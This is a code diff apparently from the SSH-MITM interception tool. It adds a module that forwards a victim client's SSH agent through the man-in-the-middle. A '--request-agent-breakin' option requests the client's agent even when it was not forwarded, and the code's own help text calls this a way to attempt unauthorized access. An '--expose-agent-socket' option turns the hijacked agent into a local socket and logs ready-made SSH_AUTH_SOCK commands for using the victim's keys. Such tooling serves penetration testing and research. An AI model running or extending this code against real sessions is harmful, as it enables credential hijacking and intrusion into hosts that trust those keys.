@@ -7,10 +7,19 @@ import tempfile
 import threading
 import time
 import uuid
+from typing import TYPE_CHECKING
 
+from colored.colored import attr, fg
 from paramiko.agent import Agent, AgentClientProxy, AgentKey, AgentServerProxy
 from paramiko.channel import Channel
+from paramiko.ssh_exception import ChannelException
 from paramiko.transport import Transport
+
+from sshmitm.core.modules import SSHMITMBaseModule
+from sshmitm.moduleparser.colors import Colors
+
+if TYPE_CHECKING:
+    from sshmitm.session import Session
 
 
 class AgentProxy:
@@ -115,3 +124,87 @@ class AgentLocalSocket:
             self._server.close()
         with contextlib.suppress(OSError):
             os.unlink(self.socket_path)
+
+
+class AgentBaseForwarder(SSHMITMBaseModule):
+    """Specifies the interface for managing SSH agent forwarding and optional agent breakin."""
+
+    def __init__(self, session: "Session") -> None:
+        super().__init__()
+        self.session = session
+
+    def request(self, existing_agent: AgentProxy | None = None) -> AgentProxy | None:
+        raise NotImplementedError
+
+
+class AgentForwarder(AgentBaseForwarder):
+    """Forwards the SSH agent from the client, with optional breakin support."""
+
+    @classmethod
+    def parser_arguments(cls) -> None:
+        plugin_group = cls.argument_group()
+        plugin_group.add_argument(
+            "--request-agent-breakin",
+            dest="request_agent_breakin",
+            action="store_true",
+            help="Enables SSH-MITM to request the SSH agent from the client, even if the client does not forward the agent. Can be used to attempt unauthorized access.",
+        )
+        plugin_group.add_argument(
+            "--expose-agent-socket",
+            dest="expose_agent_socket",
+            action="store_true",
+            help=(
+                "Expose the client's forwarded SSH agent as a local Unix socket. "
+                "Prints ready-to-use SSH_AUTH_SOCK commands to the log. "
+                "Works for SSH, SCP, and SFTP sessions (OpenSSH 8.4+). "
+                "See https://docs.ssh-mitm.at/user_guide/sshagent.html"
+            ),
+        )
+
+    def request(self, existing_agent: AgentProxy | None = None) -> AgentProxy | None:
+        if existing_agent is not None and not self.args.request_agent_breakin:
+            return existing_agent
+        try:
+            if self.session.agent_requested.wait(1) or self.args.request_agent_breakin:
+                agent = self.session.proxyserver.create_agent_proxy(self.session.transport)
+                logging.info(
+                    "%s %s - successfully requested ssh-agent",
+                    Colors.emoji("information"),
+                    Colors.stylize(self.session.sessionid, fg("light_blue") + attr("bold")),
+                )
+                if self.args.expose_agent_socket:
+                    self._expose_socket(agent)
+                return agent
+        except ChannelException:
+            logging.info(
+                "%s %s - ssh-agent breakin not successfull!",
+                Colors.emoji("warning"),
+                Colors.stylize(self.session.sessionid, fg("light_blue") + attr("bold")),
+            )
+            return existing_agent
+        return existing_agent
+
+    def _expose_socket(self, agent: AgentProxy) -> None:
+        agent.local_socket = self.session.proxyserver.create_agent_local_socket(self.session.transport)
+        sock = agent.local_socket.socket_path
+        sid = Colors.stylize(self.session.sessionid, fg("light_blue") + attr("bold"))
+
+        def _cmd(suffix: str) -> str:
+            return Colors.stylize(
+                f"SSH_AUTH_SOCK={sock} {suffix}", fg("light_blue") + attr("bold")
+            )
+
+        logging.info(
+            "%s %s - agent socket ready - docs: https://docs.ssh-mitm.at/user_guide/sshagent.html",
+            Colors.emoji("information"),
+            sid,
+        )
+        logging.info(
+            "%s %s - ssh-add:  %s", Colors.emoji("information"), sid, _cmd("ssh-add -l")
+        )
+        logging.info(
+            "%s %s - ssh:      %s",
+            Colors.emoji("information"),
+            sid,
+            _cmd("ssh user@host"),
+        )
